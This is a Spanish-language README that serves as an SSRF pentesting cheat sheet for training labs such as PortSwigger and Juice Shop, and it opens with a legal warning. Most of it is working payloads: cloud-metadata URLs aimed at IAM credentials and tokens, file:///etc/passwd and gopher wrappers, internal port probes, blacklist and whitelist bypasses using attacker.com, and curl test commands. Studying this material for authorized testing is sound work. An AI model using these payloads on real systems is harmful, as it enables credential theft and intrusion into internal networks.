<div align="center">

# 📡 SSRF
### Server-Side Request Forgery — Forzado de Requests del Servidor

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-SSRF-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **SSRF:** la app hace requests HTTP hacia destinos controlados por el usuario sin validar el destino. El servidor hace la request desde su contexto de red, bypasseando firewalls y ACLs que protegen servicios internos. El atacante puede alcanzar paneles admin, metadata de cloud, bases de datos internas. Si la respuesta no se devuelve: **Blind SSRF** — detectable via callbacks out-of-band (DNS/HTTP).

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Puntos de Entrada](#-puntos-de-entrada) |
| 04 | [🧪 Payloads Base](#-payloads-base) |
| 05 | [🧱 Payloads Avanzados](#-payloads-avanzados) |
| 06 | [🛡️ Bypass de Filtros](#️-bypass-de-filtros) |
| 07 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 08 | [⚙️ Comandos Útiles](#️-comandos-útiles) |
| 09 | [🧠 Casos Típicos](#-casos-típicos) |
| 10 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 11 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **Juice Shop** | SSRF challenge |
| **PortSwigger** | Server-side request forgery |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-interactsh-a855f7?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `Replay` — modificar parámetros URL |
| **interactsh-client** | OAST — capturar callbacks DNS/HTTP para SSRF ciego |
| **curl** | Reproducción rápida y prueba de payloads |

---

## 🔍 Puntos de Entrada

![Context](https://img.shields.io/badge/Búsqueda-Entry%20Points-ff6b00?style=flat-square)

Parámetros que aceptan URL, host o path:

- `stockApi=`, `imageUrl=`, `webhookUrl=`
- `avatarUrl=`, `fetchUrl=`, `url=`, `dest=`
- PDF generator / import URL
- URL preview / link unfurl / screenshot service
- Back-end integrations con campo host configurable
- Features que cargan recursos externos

> [!TIP]
> Buscar en `HTTP History` parámetros con valores `http://` o `https://`. Cualquier funcionalidad que cargue recursos externos es candidata.

---

## 🧪 Payloads Base

![Context](https://img.shields.io/badge/Payload-Loopback-ff3c6e?style=flat-square)

### `[01]` Loopback / localhost

```text
http://localhost/
http://127.0.0.1/
http://127.1/
http://0.0.0.0/
http://0/
http://[::1]/
http://[::]/
http://[::ffff:127.0.0.1]/
```

### `[02]` Rutas internas comunes

```text
http://127.0.0.1/admin
http://127.0.0.1/console
http://127.0.0.1/metrics
http://127.0.0.1/actuator/env
http://127.0.0.1:8080/admin
```

### `[03]` OAST — SSRF ciego

```text
https://<token>.oast.site
https://<token>.oastify.com
```

---

## 🧱 Payloads Avanzados

![Context](https://img.shields.io/badge/Técnica-Avanzada-a855f7?style=flat-square)

### `[01]` Cloud metadata (alto impacto)

```text
# AWS EC2
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token

# DigitalOcean
http://169.254.169.254/metadata/v1/

# Kubernetes
http://kubernetes.default.svc/api/v1/namespaces
```

### `[02]` Protocol wrappers

```text
file:///etc/passwd
file:///C:/Windows/win.ini
dict://attacker.com:11111/          (probe de puertos)
gopher://localhost:6379/_INFO       (Redis)
gopher://localhost:25/_EHLO         (SMTP)
ldap://localhost:11211/             (Memcached)
```

### `[03]` Scan de servicios internos

```text
http://127.0.0.1:22/        (SSH banner)
http://127.0.0.1:3306/      (MySQL)
http://127.0.0.1:5432/      (PostgreSQL)
http://127.0.0.1:6379/      (Redis)
http://127.0.0.1:8080/      (Admin panel)
http://127.0.0.1:9200/      (Elasticsearch)
http://127.0.0.1:2375/      (Docker API)
```

---

## 🛡️ Bypass de Filtros

![Context](https://img.shields.io/badge/Bypass-Blacklist%20%26%20Whitelist-ff3c6e?style=flat-square)

### Bypass de blacklist (127.0.0.1 / localhost bloqueado)

```text
Decimal:     http://2130706433/        (127.0.0.1)
Octal:       http://0177.0.0.1/
Hex:         http://0x7f000001/
IPv6:        http://[::1]/
Mixto:       http://127.0x0.0x0.1/
nip.io:      http://127.0.0.1.nip.io/
Short form:  http://127.1/
Doble URL:   http://127.0.0.1%252fadmin
```

### Bypass de whitelist (solo permitir dominio específico)

```text
Credencial falsa: http://expected.com@attacker.com/
Fragmento:        http://attacker.com#expected.com
Subdominio:       http://expected.com.attacker.com/
Path:             http://attacker.com/expected.com
```

### Open redirect chain

```text
http://victim.com/redirect?url=http://169.254.169.254/latest/meta-data/
# Si la app sigue redirecciones y hay open redirect, bypasea whitelist
```

> [!NOTE]
> Los bypasses con encoding doble (`%252f`) o credenciales (`trusted@`) funcionan cuando el servidor valida por regex antes de resolver DNS.

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Capturar request

Localizar request que acepta URL, host o path como parámetro.

### `[02]` Replay con loopback

```text
http://127.0.0.1
http://localhost
```

### `[03]` Comparar respuesta

- código HTTP diferente
- body con contenido interno
- longitud de respuesta mayor
- tiempo de respuesta diferente

### `[04]` SSRF ciego

Si no hay contenido visible:

1. `interactsh-client` → obtener URL de callback
2. Insertar URL como valor del parámetro
3. Verificar callback DNS/HTTP recibido

> [!IMPORTANT]
> SSRF ciego no devuelve output directo. Evidencia = callback out-of-band. Documentar URL usada y timestamp del callback.

---

## ⚙️ Comandos Útiles

![Tool](https://img.shields.io/badge/Tool-interactsh-a855f7?style=flat-square)

```bash
# Levantar listener OAST
interactsh-client
```

![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

```bash
# Probar SSRF básico
curl -i "http://target/product/stock?stockApi=http://127.0.0.1/admin"

# Probar metadata AWS
curl -i "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
```

---

## 🧠 Casos Típicos

| Caso | Señal |
|------|-------|
| **Against server itself** | acceso a `/admin`, `/metrics`, `localhost` |
| **Against internal systems** | puertos internos, metadata cloud, paneles admin |
| **Blind SSRF** | callback DNS/HTTP sin body visible |
| **Redirect bypass** | app sigue redirección a host bloqueado |
| **Cloud metadata** | credenciales IAM / tokens de servicio en response |

---

## 🧭 Ruta de Práctica

1. PortSwigger: basic SSRF against local server
2. PortSwigger: SSRF with blacklist bypass
3. PortSwigger: SSRF with whitelist bypass
4. PortSwigger: blind SSRF with OAST
5. Juice Shop: SSRF challenge

---

## 📝 Checklist

- [ ] parámetro SSRF aislado
- [ ] host interno alcanzable o inferido
- [ ] bypass documentado si filtros activos
- [ ] evidencia OAST guardada si SSRF ciego

---

## 🔗 Referencias

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
